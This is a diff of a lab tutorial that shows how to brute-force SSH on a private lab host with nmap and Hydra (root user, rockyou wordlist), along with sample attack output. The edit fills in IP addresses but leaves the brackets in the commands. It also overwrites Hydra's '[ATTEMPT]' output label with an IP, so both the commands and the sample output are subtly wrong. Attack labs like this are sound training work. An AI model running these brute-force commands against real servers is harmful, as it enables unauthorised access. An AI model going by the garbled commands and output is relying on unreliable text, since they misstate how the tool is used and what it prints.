@@ -28,14 +28,14 @@ SSH (Secure Shell) is used to remotely access Linux servers. Attackers try SSH b
 ### Step 1 — Verify SSH is reachable from Kali
 ```bash
 # From Kali Linux
-nmap -p 22 [ENDPOINT_IP]
+nmap -p 22 [192.168.56.30]
 # Should show: 22/tcp open ssh
 ```
 
 ### Step 2 — Run the Hydra Brute Force
 ```bash
 # Basic brute force targeting root user
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://[ENDPOINT_IP] -t 4 -V
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://[192.168.56.30] -t 4 -V
 
 # Explanation of flags:
 # -l root        → try logging in as 'root'
@@ -47,9 +47,9 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://[ENDPOINT_IP] -t 4 -V
 ### Step 3 — Observe the attack running
 You'll see output like:
 ```
-[ATTEMPT] target [ENDPOINT_IP] - login "root" - pass "123456" - 1 of 14344392
-[ATTEMPT] target [ENDPOINT_IP] - login "root" - pass "password" - 2 of 14344392
-[ATTEMPT] target [ENDPOINT_IP] - login "root" - pass "12345678" - 3 of 14344392
+[192.168.42.128] target [192.168.56.30] - login "root" - pass "123456" - 1 of 14344392
+[192.168.42.128] target [192.168.56.30] - login "root" - pass "password" - 2 of 14344392
+[192.168.42.128] target [192.168.56.30] - login "root" - pass "12345678" - 3 of 14344392
 ```
 
 Stop the attack after a minute or two with `Ctrl+C` — you don't need to complete it.
